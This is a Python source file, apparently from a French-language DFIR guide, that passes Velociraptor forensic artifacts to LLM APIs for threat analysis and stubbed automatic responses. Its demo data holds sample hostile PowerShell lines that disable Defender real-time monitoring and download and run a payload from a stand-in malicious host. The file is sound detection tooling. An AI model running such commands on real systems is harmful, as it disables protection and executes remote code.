#!/usr/bin/env python3
"""
Velociraptor AI-Augmented Detection & Response
================================================
Intègre Velociraptor avec des LLMs pour l'analyse automatisée
Supporte: Gemini, OpenAI GPT, Claude, Ollama (local)

Author: Help4Info
Repository: github.com/Help4Info/velociraptor-dfir-guide
"""

import os
import json
import requests
import time
from datetime import datetime
from typing import Dict, List, Optional
from dataclasses import dataclass
from enum import Enum

# ============================================================
# CONFIGURATION
# ============================================================

class AIProvider(Enum):
    GEMINI = "gemini"
    OPENAI = "openai"
    CLAUDE = "claude"
    OLLAMA = "ollama"

@dataclass
class Config:
    # Velociraptor
    velociraptor_url: str = "https://192.168.1.48:8889"
    velociraptor_api_key: str = ""

    # AI Providers
    ai_provider: AIProvider = AIProvider.GEMINI
    gemini_api_key: str = ""
    openai_api_key: str = ""
    claude_api_key: str = ""
    ollama_url: str = "http://localhost:11434"

    # Settings
    auto_response_enabled: bool = False
    severity_threshold: int = 7  # 1-10

config = Config()

# ============================================================
# AI PROVIDERS
# ============================================================

class AIAnalyzer:
    """Classe de base pour l'analyse AI"""

    SYSTEM_PROMPT = """Tu es un expert en cybersécurité spécialisé en DFIR (Digital Forensics and Incident Response).

Ton rôle est d'analyser les artefacts forensiques collectés par Velociraptor et de:
1. Identifier les indicateurs de compromission (IOCs)
2. Mapper les techniques MITRE ATT&CK
3. Évaluer la sévérité (1-10)
4. Recommander des actions de remédiation
5. Générer un résumé exécutif

Réponds TOUJOURS en JSON avec ce format:
{
    "severity": 8,
    "summary": "Description courte",
    "mitre_techniques": ["T1059.001", "T1562.001"],
    "iocs": ["fichier.exe", "192.168.1.100"],
    "recommendations": ["Action 1", "Action 2"],
    "auto_response": "ISOLATE|BLOCK|ALERT|NONE",
    "details": "Analyse détaillée..."
}
"""

    def analyze(self, data: Dict) -> Dict:
        raise NotImplementedError


class GeminiAnalyzer(AIAnalyzer):
    """Analyseur utilisant Google Gemini Flash 2.0"""

    def __init__(self, api_key: str):
        self.api_key = api_key
        self.url = "https://generativelanguage.googleapis.com/v1beta/models/gemini-2.0-flash:generateContent"

    def analyze(self, data: Dict) -> Dict:
        headers = {"Content-Type": "application/json"}

        payload = {
            "contents": [{
                "parts": [{
                    "text": f"{self.SYSTEM_PROMPT}\n\nAnalyse ces données forensiques:\n{json.dumps(data, indent=2)}"
                }]
            }],
            "generationConfig": {
                "temperature": 0.1,
                "maxOutputTokens": 2048
            }
        }

        response = requests.post(
            f"{self.url}?key={self.api_key}",
            headers=headers,
            json=payload,
            timeout=30
        )

        if response.status_code == 200:
            result = response.json()
            text = result["candidates"][0]["content"]["parts"][0]["text"]
            # Extraire le JSON de la réponse
            return self._parse_json_response(text)
        else:
            return {"error": f"Gemini API error: {response.status_code}"}

    def _parse_json_response(self, text: str) -> Dict:
        try:
            # Chercher le JSON dans la réponse
            start = text.find("{")
            end = text.rfind("}") + 1
            if start != -1 and end > start:
                return json.loads(text[start:end])
        except json.JSONDecodeError:
            pass
        return {"raw_response": text}


class OpenAIAnalyzer(AIAnalyzer):
    """Analyseur utilisant OpenAI GPT-4"""

    def __init__(self, api_key: str):
        self.api_key = api_key
        self.url = "https://api.openai.com/v1/chat/completions"

    def analyze(self, data: Dict) -> Dict:
        headers = {
            "Content-Type": "application/json",
            "Authorization": f"Bearer {self.api_key}"
        }

        payload = {
            "model": "gpt-4-turbo-preview",
            "messages": [
                {"role": "system", "content": self.SYSTEM_PROMPT},
                {"role": "user", "content": f"Analyse ces données forensiques:\n{json.dumps(data, indent=2)}"}
            ],
            "temperature": 0.1,
            "response_format": {"type": "json_object"}
        }

        response = requests.post(self.url, headers=headers, json=payload, timeout=60)

        if response.status_code == 200:
            result = response.json()
            return json.loads(result["choices"][0]["message"]["content"])
        else:
            return {"error": f"OpenAI API error: {response.status_code}"}


class ClaudeAnalyzer(AIAnalyzer):
    """Analyseur utilisant Anthropic Claude"""

    def __init__(self, api_key: str):
        self.api_key = api_key
        self.url = "https://api.anthropic.com/v1/messages"

    def analyze(self, data: Dict) -> Dict:
        headers = {
            "Content-Type": "application/json",
            "x-api-key": self.api_key,
            "anthropic-version": "2024-01-01"
        }

        payload = {
            "model": "claude-3-5-sonnet-20241022",
            "max_tokens": 2048,
            "system": self.SYSTEM_PROMPT,
            "messages": [
                {"role": "user", "content": f"Analyse ces données forensiques:\n{json.dumps(data, indent=2)}"}
            ]
        }

        response = requests.post(self.url, headers=headers, json=payload, timeout=60)

        if response.status_code == 200:
            result = response.json()
            text = result["content"][0]["text"]
            start = text.find("{")
            end = text.rfind("}") + 1
            if start != -1 and end > start:
                return json.loads(text[start:end])
        return {"error": f"Claude API error: {response.status_code}"}


class OllamaAnalyzer(AIAnalyzer):
    """Analyseur utilisant Ollama (LLM local)"""

    def __init__(self, url: str = "http://localhost:11434", model: str = "llama3.1"):
        self.url = url
        self.model = model

    def analyze(self, data: Dict) -> Dict:
        payload = {
            "model": self.model,
            "prompt": f"{self.SYSTEM_PROMPT}\n\nAnalyse ces données forensiques:\n{json.dumps(data, indent=2)}",
            "stream": False,
            "format": "json"
        }

        response = requests.post(f"{self.url}/api/generate", json=payload, timeout=120)

        if response.status_code == 200:
            result = response.json()
            return json.loads(result["response"])
        return {"error": f"Ollama error: {response.status_code}"}


# ============================================================
# VELOCIRAPTOR CLIENT
# ============================================================

class VelociraptorClient:
    """Client pour l'API Velociraptor"""

    def __init__(self, url: str, api_key: str = None, verify_ssl: bool = False):
        self.url = url.rstrip("/")
        self.api_key = api_key
        self.verify_ssl = verify_ssl
        self.session = requests.Session()
        if api_key:
            self.session.headers["Authorization"] = f"Bearer {api_key}"

    def get_clients(self) -> List[Dict]:
        """Récupère la liste des clients connectés"""
        # Note: Nécessite configuration API Velociraptor
        # Alternative: utiliser velociraptor CLI
        pass

    def get_hunt_results(self, hunt_id: str) -> List[Dict]:
        """Récupère les résultats d'un hunt"""
        pass

    def collect_artifact(self, client_id: str, artifact: str, params: Dict = None) -> str:
        """Lance une collection d'artifact"""
        pass

    def isolate_client(self, client_id: str) -> bool:
        """Isole un client du réseau"""
        pass


# ============================================================
# AUTO RESPONSE ENGINE
# ============================================================

class AutoResponseEngine:
    """Moteur de réponse automatique basé sur l'analyse AI"""

    def __init__(self, velociraptor: VelociraptorClient):
        self.velociraptor = velociraptor
        self.actions_log = []

    def execute_response(self, client_id: str, analysis: Dict) -> Dict:
        """Exécute la réponse automatique basée sur l'analyse AI"""

        response_action = analysis.get("auto_response", "NONE")
        severity = analysis.get("severity", 0)

        result = {
            "timestamp": datetime.now().isoformat(),
            "client_id": client_id,
            "severity": severity,
            "action_taken": response_action,
            "success": False
        }

        if severity < config.severity_threshold:
            result["action_taken"] = "NONE (below threshold)"
            result["success"] = True
            return result

        if response_action == "ISOLATE":
            # Isoler le client du réseau
            result["success"] = self._isolate_client(client_id)
            result["details"] = "Client isolated from network"

        elif response_action == "BLOCK":
            # Bloquer les IOCs identifiés
            iocs = analysis.get("iocs", [])
            result["success"] = self._block_iocs(iocs)
            result["details"] = f"Blocked {len(iocs)} IOCs"

        elif response_action == "ALERT":
            # Envoyer une alerte
            result["success"] = self._send_alert(client_id, analysis)
            result["details"] = "Alert sent to SOC team"

        else:
            result["action_taken"] = "NONE"
            result["success"] = True

        self.actions_log.append(result)
        return result

    def _isolate_client(self, client_id: str) -> bool:
        """Isole un client via Velociraptor"""
        print(f"[AUTO-RESPONSE] Isolating client {client_id}")
        # Implémenter l'isolation via Velociraptor
        # velociraptor.isolate_client(client_id)
        return True

    def _block_iocs(self, iocs: List[str]) -> bool:
        """Bloque les IOCs (IP, domaines, hashes)"""
        print(f"[AUTO-RESPONSE] Blocking IOCs: {iocs}")
        # Implémenter le blocage via firewall/EDR
        return True

    def _send_alert(self, client_id: str, analysis: Dict) -> bool:
        """Envoie une alerte au SOC"""
        print(f"[AUTO-RESPONSE] Alert for {client_id}: Severity {analysis.get('severity')}")
        # Implémenter notification (email, Slack, Teams, etc.)
        return True


# ============================================================
# MAIN ANALYZER PIPELINE
# ============================================================

class DFIRPipeline:
    """Pipeline principal d'analyse DFIR augmentée par AI"""

    def __init__(self, ai_provider: AIProvider = AIProvider.GEMINI):
        self.ai_provider = ai_provider
        self.analyzer = self._init_analyzer()
        self.velociraptor = VelociraptorClient(config.velociraptor_url)
        self.auto_response = AutoResponseEngine(self.velociraptor)

    def _init_analyzer(self) -> AIAnalyzer:
        """Initialise l'analyseur AI approprié"""
        if self.ai_provider == AIProvider.GEMINI:
            return GeminiAnalyzer(config.gemini_api_key)
        elif self.ai_provider == AIProvider.OPENAI:
            return OpenAIAnalyzer(config.openai_api_key)
        elif self.ai_provider == AIProvider.CLAUDE:
            return ClaudeAnalyzer(config.claude_api_key)
        elif self.ai_provider == AIProvider.OLLAMA:
            return OllamaAnalyzer(config.ollama_url)
        else:
            raise ValueError(f"Unknown AI provider: {self.ai_provider}")

    def analyze_artifact(self, artifact_data: Dict, client_id: str = None) -> Dict:
        """Analyse un artefact avec l'AI et déclenche la réponse auto si nécessaire"""

        print(f"[PIPELINE] Analyzing artifact with {self.ai_provider.value}...")
        start_time = time.time()

        # Analyse AI
        analysis = self.analyzer.analyze(artifact_data)
        analysis["analysis_time"] = time.time() - start_time
        analysis["ai_provider"] = self.ai_provider.value

        print(f"[PIPELINE] Analysis complete in {analysis['analysis_time']:.2f}s")
        print(f"[PIPELINE] Severity: {analysis.get('severity', 'N/A')}")
        print(f"[PIPELINE] MITRE: {analysis.get('mitre_techniques', [])}")

        # Réponse automatique si activée
        if config.auto_response_enabled and client_id:
            response = self.auto_response.execute_response(client_id, analysis)
            analysis["auto_response_result"] = response

        return analysis

    def process_hunt_results(self, hunt_id: str) -> List[Dict]:
        """Traite tous les résultats d'un hunt"""
        # Implémenter le traitement batch des résultats
        pass

    def generate_report(self, analyses: List[Dict]) -> str:
        """Génère un rapport consolidé"""
        report = {
            "generated_at": datetime.now().isoformat(),
            "total_analyses": len(analyses),
            "high_severity": len([a for a in analyses if a.get("severity", 0) >= 7]),
            "analyses": analyses
        }
        return json.dumps(report, indent=2)


# ============================================================
# EXEMPLE D'UTILISATION
# ============================================================

def demo_analysis():
    """Démonstration de l'analyse AI"""

    # Données d'exemple (simulant un artefact Velociraptor)
    sample_artifact = {
        "source": "Windows.EventLogs.PowershellScriptblock",
        "client_id": "C.54b3f7d051fbbebd",
        "hostname": "DESKTOP-7IE75MQ",
        "timestamp": "2026-02-01T12:00:00Z",
        "events": [
            {
                "TimeCreated": "2026-02-01T11:55:00Z",
                "EventID": 4104,
                "ScriptBlockText": "Set-MpPreference -DisableRealtimeMonitoring $true"
            },
            {
                "TimeCreated": "2026-02-01T11:56:00Z",
                "EventID": 4104,
                "ScriptBlockText": "Invoke-WebRequest -Uri 'https://malicious.com/payload.exe' -OutFile 'C:\\Temp\\update.exe'"
            },
            {
                "TimeCreated": "2026-02-01T11:57:00Z",
                "EventID": 4104,
                "ScriptBlockText": "C:\\Temp\\update.exe"
            }
        ],
        "files_found": [
            {"path": "C:\\Temp\\update.exe", "size": 45056, "hash": "abc123..."},
            {"path": "C:\\Users\\admin\\AppData\\Roaming\\credentials.txt", "size": 128}
        ]
    }

    # Configuration (remplacer par vos clés API)
    config.gemini_api_key = os.getenv("GEMINI_API_KEY", "YOUR_GEMINI_API_KEY")
    config.auto_response_enabled = True
    config.severity_threshold = 7

    # Analyse
    pipeline = DFIRPipeline(AIProvider.GEMINI)
    result = pipeline.analyze_artifact(sample_artifact, client_id="C.54b3f7d051fbbebd")

    print("\n" + "="*60)
    print("RÉSULTAT DE L'ANALYSE AI")
    print("="*60)
    print(json.dumps(result, indent=2))


if __name__ == "__main__":
    demo_analysis()
